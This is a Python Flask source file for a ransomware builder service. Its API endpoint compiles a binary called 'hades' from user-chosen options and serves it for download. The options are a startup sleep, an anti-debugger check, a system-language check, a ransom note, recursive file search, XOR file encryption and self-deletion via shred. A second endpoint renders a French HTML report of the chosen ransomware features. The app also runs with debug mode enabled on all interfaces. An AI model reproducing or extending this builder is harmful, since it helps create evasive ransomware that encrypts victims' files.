
from flask import render_template, Response, send_file
from flask import request
from flask import Flask

import subprocess

app = Flask(__name__)

class Options:

    _SEARCH_DIRECTORY = 0x0
    _SEARCH_RECURSIVELY = 0x1

    _SEARCH = dict()
    _SEARCH[_SEARCH_DIRECTORY] = "normal"
    _SEARCH[_SEARCH_RECURSIVELY] = "recursive"

    _ENCRYPT_NONE = 0x0
    _ENCRYPT_XOR = 0x1
    _ENCRYPT_AES = 0x2
    _ENCRYPT_RSA = 0x3
    
    _ENCRYPT = dict()
    _ENCRYPT[_ENCRYPT_NONE] = "None"
    _ENCRYPT[_ENCRYPT_XOR] = "XOR"
    _ENCRYPT[_ENCRYPT_AES] = "AES"
    _ENCRYPT[_ENCRYPT_RSA] = "RSA"

    SLEEP = None
    CHECK_DEBUG = None
    CHECK_LANGUAGE = None
    ADD_NOTES = None
    GET_FILES = None
    ENCRYPTION = None
    AUTODELETE = None

    def __init__(self, request_options: request) -> None:
        self.makecmd = ["make"]
        self.request_options = request_options

        self.SLEEP = request_options.get("sleep", None)
        self.CHECK_DEBUG = request_options.get("debug", None)
        self.CHECK_LANGUAGE = request_options.get("language", None)
        self.ADD_NOTES = request_options.get("notes", None)
        self.GET_FILES = int(request_options.get("get-files", Options._SEARCH_DIRECTORY))
        self.ENCRYPTION = int(request_options.get("encrypt-files", Options._ENCRYPT_NONE))
        self.AUTODELETE = request_options.get("auto-delete", None)
    
    def makeSleep(self) -> None:
        if self.SLEEP:
            self.makecmd.append("sleep")
        else:
            self.makecmd.append("nosleep")
    
    def makeDebug(self) -> None:
        if self.CHECK_DEBUG:
            self.makecmd.append("debug")
        else:
            self.makecmd.append("nodebug")
    
    def makeLanguage(self) -> None:
        if self.CHECK_LANGUAGE:
            self.makecmd.append("language")
        else:
            self.makecmd.append("nolanguage")
    
    def makeAddNotes(self) -> None:
        if self.ADD_NOTES:
            self.makecmd.append("note")
        else:
            self.makecmd.append("nonote")
    
    def makeGetFiles(self) -> None:
        return

    def makeEncryption(self) -> None:
        if self.ENCRYPTION == self._ENCRYPT_NONE:
            self.makecmd.append("noencrypt")
        elif self.ENCRYPTION == self._ENCRYPT_XOR:
            self.makecmd.append("xorencrypt")
        else:
            raise NotImplementedError
    
    def makeAutoDelete(self) -> None:
        if self.AUTODELETE:
            self.makecmd.append("autodelete")
        else:
            self.makecmd.append("noautodelete")
    
    def makeCompile(self) -> None:
        self.makecmd.append("compile")

    def generateMake(self) -> list:
        self.makeSleep()
        self.makeDebug()
        self.makeLanguage()
        self.makeAddNotes()
        self.makeGetFiles()
        self.makeEncryption()
        self.makeAutoDelete()
        self.makeCompile()

        return self.makecmd

@app.route("/")
def root():
    return render_template("index.html")

@app.route("/api/generate", methods=["POST"])
def api_generate():
    options = Options(request.json)

    makecmd = options.generateMake()

    process = subprocess.Popen(makecmd, stdout=subprocess.PIPE)
    status = process.wait()

    if not status:
        return send_file("hades")
    else:
        return Response(f"Error {status}: {process.stdout.readline()}", status=403)

@app.route("/api/rapport", methods=["POST"])
def create_html():

    options = Options(request.json)

    header = """
    <!DOCTYPE html>
<html>
<head>
<title>Résumé du ransomware</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
<style>
body,h1,h2,h3,h4,h5 {font-family: "Raleway", sans-serif}
</style>
</head>
<body class="w3-light-grey">

<!-- w3-content defines a container for fixed size centered content, 
and is wrapped around the whole page content, except for the footer in this example -->
<div class="w3-content" style="max-width:1400px">

<!-- Header -->
<header class="w3-container w3-center w3-padding-32"> 
  <h1><b>RANSOMWARE</b></h1>
  <p>Résumé du <span class="w3-tag">ransomware</span> créé.</p>
</header>

<!-- Grid -->
<div class="w3-row">

<!-- Blog entries -->
<div class="w3-col l8 s12">
  <!-- Blog entry -->
  <div class="w3-card-4 w3-margin w3-white">
    <div class="w3-container">
      <h3><b>DESCRIPTION</b></h3>
      <h5>Courte description du ransomware créé.</h5>
    </div>

    <div class="w3-container">
      <p>Voici les caractéristiques que vous avez choisi pour votre ransomware.
        <ul>
"""

    mid = """
    </ul>
        <div class="w3-row">
        <div class="w3-col m8 s12">
          <p><button class="w3-button w3-padding-large w3-white w3-border"><b>THANKS</b></button></p>
        </div>
        <div class="w3-col m4 w3-hide-small">
          <p><span class="w3-padding-large w3-right"><b>Comments  </b> <span class="w3-tag">0</span></span></p>
        </div>
      </div>
    </div>
  </div>
  <hr>
<!-- END BLOG ENTRIES -->
</div>

<!-- Introduction menu -->
<div class="w3-col l4">
 
  <!-- Labels / tags -->
  <div class="w3-card w3-margin">
    <div class="w3-container w3-padding">
      <h4>Tags</h4>
    </div>
    <div class="w3-container w3-white">
    <p>
    """

    footer = """
    </p>
    </div>
  </div>
  
<!-- END Introduction Menu -->
</div>

<!-- END GRID -->
</div><br>

<!-- END w3-content -->
</div>

<!-- Footer -->
<footer class="w3-container w3-dark-grey w3-padding-32 w3-margin-top"></footer>

</body>
</html>
    """

    opt = list()
    tag = list()

    if options.SLEEP:
        opt.append("<li>SLEEP: Le binaire va sleep durant une dizaine de secondes au lancement</li>")
        tag.append('<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">SLEEP</span>')
    
    if options.CHECK_DEBUG:
        opt.append("<li>CHECK DEBUG: Le binaire va vérifier qu'il ne soit pas debug au lancement</li>")
        tag.append('<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">CHECK DEBUG</span>')
    
    if options.CHECK_LANGUAGE:
        opt.append("<li>CHECK LANGUAGE: Le binaire va vérifier la langue du système au lancement</li>")
        tag.append('<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">CHECK LANGUAGE</span>')

    if options.ADD_NOTES:
        opt.append("<li>ADD NOTES: Le binaire va ajouter un fichier de note</li>")
        tag.append('<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">ADD NOTES</span>')

    opt.append(f"<li>GET FILES: Le binaire va chercher de manière {options._SEARCH[options._SEARCH_DIRECTORY]} les fichiers</li>")
    tag.append('<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">GET FILES</span>')

    opt.append(f"<li>ENCRYPTION: Le binaire va utiliser le type de chiffrement {options._ENCRYPT[options.ENCRYPTION]}</li>")
    tag.append('<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">ENCRYPTION</span>')

    if options.AUTODELETE:
        opt.append("<li>AUTODELETE: Le binaire va utiliser la command shred afin de se supprimer sur FS local</li>")
        tag.append('<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">AUTODELETE</span>')
    
    HTML = header + "".join(opt) + mid + "".join(tag) + footer

    return HTML

if __name__ == "__main__":
    app.run(debug=True, port=80, host="0.0.0.0")
